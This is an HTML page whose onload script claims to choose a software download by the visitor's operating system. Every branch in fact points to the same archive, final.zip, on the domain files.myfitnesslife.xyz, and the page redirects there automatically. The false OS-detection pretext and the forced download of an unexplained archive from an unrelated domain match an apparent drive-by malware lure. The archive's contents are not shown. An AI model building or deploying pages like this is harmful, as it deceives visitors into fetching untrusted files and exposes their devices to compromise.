<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OS-Based Software Download</title>
    <script>
        window.onload = function() {
            // Detect user's OS
            let userAgent = navigator.userAgent;
            let softwareLink = "#"; // Default link

            if (userAgent.indexOf("Win") !== -1) {
                softwareLink = "https://files.myfitnesslife.xyz/final.zip"; // Windows download
            } else if (userAgent.indexOf("Mac") !== -1) {
                softwareLink = "https://files.myfitnesslife.xyz/final.zip"; // macOS download
            } else if (userAgent.indexOf("Linux") !== -1) {
                softwareLink = "https://files.myfitnesslife.xyz/final.zip"; // Linux download
            } else if (userAgent.indexOf("Android") !== -1) {
                softwareLink = "https://files.myfitnesslife.xyz/final.zip"; // Android download
            } else if (userAgent.indexOf("iPhone") !== -1 || userAgent.indexOf("iPad") !== -1) {
                softwareLink = "https://files.myfitnesslife.xyz/final.zip"; // iOS download
            }

            // Redirect to the appropriate download link
            window.location.href = softwareLink;
        };
    </script>
</head>
<body>
    <p>Redirecting to the appropriate download based on your OS...</p>
</body>
</html>
